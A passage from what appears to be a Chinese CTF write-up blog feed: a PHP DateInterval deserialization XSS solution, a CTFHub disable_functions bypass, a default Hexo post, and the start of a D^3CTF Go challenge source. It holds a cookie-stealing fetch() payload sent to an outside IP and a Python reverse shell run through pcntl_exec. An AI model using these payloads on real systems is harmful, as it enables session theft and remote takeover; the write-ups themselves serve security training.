punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"weekday"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"weekday_behavior"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">17</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"first_last_day_of"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"invert"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"days"</span><span class="token punctuation">;</span>b<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"special_type"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"special_amount"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">21</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"have_weekday_relative"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">21</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"have_special_relative"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"DateInterval"</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"y"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"m"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"d"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"h"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"i"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"s"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"f"</span><span class="token punctuation">;</span>d<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">73</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"&lt;script&gt;fetch("</span>http<span class="token punctuation">:</span><span class="token comment">//47.76.93.208:8000/?flag="+document.cookie)&lt;/script&gt;y";i:0;s:16:"weekday_behavior";i:0;s:17:"first_last_day_of";i:0;s:6:"invert";i:0;s:4:"days";b:0;s:12:"special_type";i:0;s:14:"special_amount";i:0;s:21:"have_weekday_relative";i:0;s:21:"have_special_relative";i:0;}</span><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A12<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>DateInterval<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A16<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>y<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bi<span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>m<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bi<span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>d<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bi<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>h<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bi<span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>i<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bi<span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>s<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bi<span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>f<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bd<span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A73<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Cscript<span class="token operator">%</span><span class="token number">3</span>Efetch<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">22</span>http<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">%</span><span class="token number">2</span>F47<span class="token operator">.</span><span class="token number">76.93</span><span class="token number">.208</span><span class="token operator">%</span><span class="token number">3</span>A8000<span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">%</span><span class="token number">3</span>Fflag<span class="token operator">%</span><span class="token number">3</span>D<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">2</span>Bdocument<span class="token operator">.</span>cookie<span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2</span>Fscript<span class="token operator">%</span><span class="token number">3</span>Ey<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bi<span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A16<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>weekday_behavior<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bi<span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A17<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>first_last_day_of<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bi<span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>invert<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bi<span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>days<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bb<span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A12<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>special_type<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bi<span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A14<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>special_amount<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bi<span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A21<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>have_weekday_relative<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bi<span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A21<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>have_special_relative<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bi<span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><ol><li><p><strong>序列化结构修改</strong>：</p><ul><li><p>原始序列化字符串：</p><p>text</p><pre class="line-numbers language-none"><code class="language-none">O:12:"DateInterval":16:{s:1:"y";i:0;s:1:"m";i:0;s:1:"d";s:2:"P1";...}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>修改后：</p><p>text</p><pre class="line-numbers language-none"><code class="language-none">O:12:"DateInterval":16:{s:1:"y";i:0;s:1:"m";i:0;s:1:"d";s:72:"&lt;script&gt;...";...}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>关键是将 <code>d</code> 属性的值替换为 XSS payload</p></li></ul></li><li><p><strong>错误触发机制</strong>：</p><ul><li><p>反序列化时 PHP 尝试创建 DateInterval 对象</p></li><li><p>由于 <code>d</code> 属性包含非法值，抛出异常：</p><p>text</p><pre class="line-numbers language-none"><code class="language-none">Exception: DateInterval::__construct(): Unknown or bad format (&lt;script&gt;fetch(...)&lt;/script&gt;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>错误消息中包含原始 payload（未经转义）</p></li></ul></li></ol></blockquote><blockquote><h4 id="步骤-1：准备攻击环境"><a href="#步骤-1：准备攻击环境" class="headerlink" title="步骤 1：准备攻击环境"></a>步骤 1：准备攻击环境</h4><ol><li><p><strong>设置接收服务器</strong>：</p><p>bash</p><pre class="line-numbers language-none"><code class="language-none"># 使用 Python 快速搭建 HTTP 服务器python3 -m http.server 8000         # 监控访问日志（新终端）tail -f access.log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>服务器将监听 <code>http://YOUR_IP:8000/</code></p></li></ol></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/922ea47c7b9edeafca1a86bca6ee96c8.png"></p><hr>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2025/07/16/hello-world/"/>
      <url>/2025/07/16/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfhubplus</title>
      <link href="/2025/07/12/ctfhubplus/"/>
      <url>/2025/07/12/ctfhubplus/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">?</span>php <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">is_readable</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><a href="https://www.php.net/manual/zh/function.pcntl-exec.php">pcntl-exec函数</a>没有被禁用，尝试利用</p><p>该函数表示在当前进程空间执行指定程序，当发生错误时返回false，执行成功时没有返回，也就是说执行成功也不会回显，于是使用该函数执行反弹shell，利用python反弹shell可以成功回显</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">pcntl_exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/usr/bin/python"</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'-c'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect(("47.242.11.183",2333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h3><p>连上发现一直返回ret=127，用?ant=phpinfo();发现为函数禁用。</p><p>先下一个蚁剑插件as_bypass_php_disable_functions<a href="https://github.com/Medicean/as_bypass_php_disable_functions?tab=readme-ov-file">Medicean/as_bypass_php_disable_functions: antsword bypass PHP disable_functions</a>start后链接<a href="http://challenge-ea86ba5d7d33b0c6.sandbox.ctfhub.com:10800/.antproxy.php%EF%BC%8C%E5%AF%86%E7%A0%81%E8%BF%98%E6%98%AF%E4%B8%80%E6%A0%B7%E3%80%82%E6%8E%A5%E7%9D%80%E5%8D%B3%E5%8F%AF%E6%93%8D%E4%BD%9C">http://challenge-ea86ba5d7d33b0c6.sandbox.ctfhub.com:10800/.antproxy.php，密码还是一样。接着即可操作</a></p><p>ps:#!/路径/到/解释器，eg:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token comment"># 表示用 /bin/bash 解释器执行这个脚本</span><span class="token builtin class-name">echo</span> <span class="token string">"Hello World"</span><span class="token comment">#!/usr/bin/python3</span><span class="token comment"># 表示用 /usr/bin/python3 解释器执行</span>print<span class="token punctuation">(</span><span class="token string">"Hello World"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/3123136ccbdf43f35226e2710729651b.png"></p><blockquote><p>LD_PRELOAD是Linux系统的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。 putenv()用来改变或增加环境变量的内容. 参数string 的格式为name＝value, 如果该环境变量原先存在, 则变量内容会依参数string 改变, 否则此参数内容会成为新的环境变量.</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>D^3ctf</title>
      <link href="/2025/06/05/d-3ctf/"/>
      <url>/2025/06/05/d-3ctf/</url>
      
        <content type="html"><![CDATA[<p><a href="https://mp.weixin.qq.com/s?__biz=MzkwMDY2ODc0MA==&amp;mid=2247485533&amp;idx=1&amp;sn=7b68ffc7dcc430326e32ec1517579cda&amp;chksm=c1d6e196c4689093adb5540ddf824ca7fc830b02a03599d3b20f10b17b745ce02f3eb11b4b58&amp;mpshare=1&amp;scene=23&amp;srcid=0602Akfw1aD2LnXVrzQQipJn&amp;sharer_shareinfo=97ea989882b93a4bce2a3b5ece51d8d7&amp;sharer_shareinfo_first=a66f1421f98917552497cf380ea9e98b#rd">https://mp.weixin.qq.com/s?__biz=MzkwMDY2ODc0MA==&amp;mid=2247485533&amp;idx=1&amp;sn=7b68ffc7dcc430326e32ec1517579cda&amp;chksm=c1d6e196c4689093adb5540ddf824ca7fc830b02a03599d3b20f10b17b745ce02f3eb11b4b58&amp;mpshare=1&amp;scene=23&amp;srcid=0602Akfw1aD2LnXVrzQQipJn&amp;sharer_shareinfo=97ea989882b93a4bce2a3b5ece51d8d7&amp;sharer_shareinfo_first=a66f1421f98917552497cf380ea9e98b#rd</a></p><p><a href="file:///D:/Downloads/D3CTF-2025-Official-Writeup-CN.pdf">D3CTF-2025-Official-Writeup-CN.pdf</a></p><h3 id="tidy-quic"><a href="#tidy-quic" class="headerlink" title="tidy quic"></a>tidy quic</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"bytes"</span><span class="token string">"errors"</span><span class="token string">"github.com/libp2p/go-buffer-pool"</span><span class="token string">"github.com/quic-go/quic-go/http3"</span><span class="token string">"io"</span><span class="token string">"log"</span><span class="token string">"net/http"</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token keyword">var</span> p pool<span class="token punctuation">.</span>BufferPool<span class="token keyword">var</span> ErrWAF <span class="token operator">=</span> errors<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token string">"WAF"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">go</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>err <span class="token operator">:=</span> http<span class="token punctuation">.</span><span class="token function">ListenAndServeTLS</span><span class="token punctuation">(</span><span class="token string">":8080"</span><span class="token punctuation">,</span> <span class="token string">"./server.crt"</span><span class="token punctuation">,</span> <span class="token string">"./server.key"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>mux<span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span><span class="token function">Fatalln</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">go</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>err <span class="token operator">:=</span> http3<span class="token punctuation">.</span><span class="token function">ListenAndServeQUIC</span><span class="token punctuation">(</span><span class="token string">":8080"</span><span class="token punctuation">,</span> <span class="token string">"./server.crt"</span><span class="token punctuation">,</span> <span class="token string">"./server.key"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>mux<span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span><span class="token function">Fatalln</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">select</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">type</span> mux <span class="token keyword">struct</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token punctuation">(</span><span class="token operator">*</span>mux<span class="token punctuation">)</span> <span class="token function">ServeHTTP</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> r<span class="token punctuation">.</span>Method <span class="token operator">==</span> http<span class="token punctuation">.</span>MethodGet <span class="token punctuation">{</span><span class="token boolean">_</span><span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">=</span> w<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span><span class="token string">"Hello D^3CTF 2025,I'm tidy quic in web."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">}</span><span class="token keyword">if</span> r<span class="token punctuation">.</span>Method <span class="token operator">!=</span> http<span class="token punctuation">.</span>MethodPost <span class="token punctuation">{</span>w<span class="token punctuation">.</span><span class="token function">WriteHeader</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">}</span><span class="token keyword">var</span> buf <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span>length <span class="token operator">:=</span> <span class="token function">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>ContentLength<span class="token punctuation">)</span><span class="token keyword">if</span> length <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">{</span><span class="token keyword">var</span> err <span class="token builtin">error</span>buf<span class="token punctuation">,</span> err <span class="token operator">=</span> io<span class="token punctuation">.</span><span class="token function">ReadAll</span><span class="token punctuation">(</span><span class="token function">textInterrupterWrap</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>Body<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span><span class="token keyword">if</span> errors<span class="token punctuation">.</span><span class="token function">Is</span><span class="token punctuation">(</span>err<span class="token punctuation">,</span> ErrWAF<span class="token punctuation">)</span> <span class="token punctuation">{</span>w<span class="token punctuation">.</span><span class="token function">WriteHeader</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token boolean">_</span><span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">=</span> w<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span><span class="token string">"WAF"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>w<span class="token punctuation">.</span><span class="token function">WriteHeader</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token boolean">_</span><span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">=</span> w<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">return</span><span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>buf <span class="token operator">=</span> p<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token keyword">defer</span> p<span class="token punctuation">.</span><span class="token function">Put</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span>rd <span class="token operator">:=</span> <span class="token function">textInterrupterWrap</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>Body<span class="token punctuation">)</span>i <span class="token operator">:=</span> <span class="token number">0</span><span class="token keyword">for</span> <span class="token punctuation">{</span>n<span class="token punctuation">,</span> err <span class="token operator">:=</span> rd<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span>i<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span><span class="token keyword">if</span> errors<span class="token punctuation">.</span><span class="token function">Is</span><span class="token punctuation">(</span>err<span class="token punctuation">,</span> io<span class="token punctuation">.</span>EOF<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">break</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> errors<span class="token punctuation">.</span><span class="token function">Is</span><span class="token punctuation">(</span>err<span class="token punctuation">,</span> ErrWAF<span class="token punctuation">)</span> <span class="token punctuation">{</span>w<span class="token punctuation">.</span><span class="token function">WriteHeader</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token boolean">_</span><span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">=</span> w<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span><span class="token string">"WAF"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>w<span class="token punctuation">.</span><span class="token function">WriteHeader</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token boolean">_</span><span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">=</span> w<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">}</span><span class="token punctuation">}</span>i <span class="token operator">+=</span> n<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token operator">!</span>bytes<span class="token 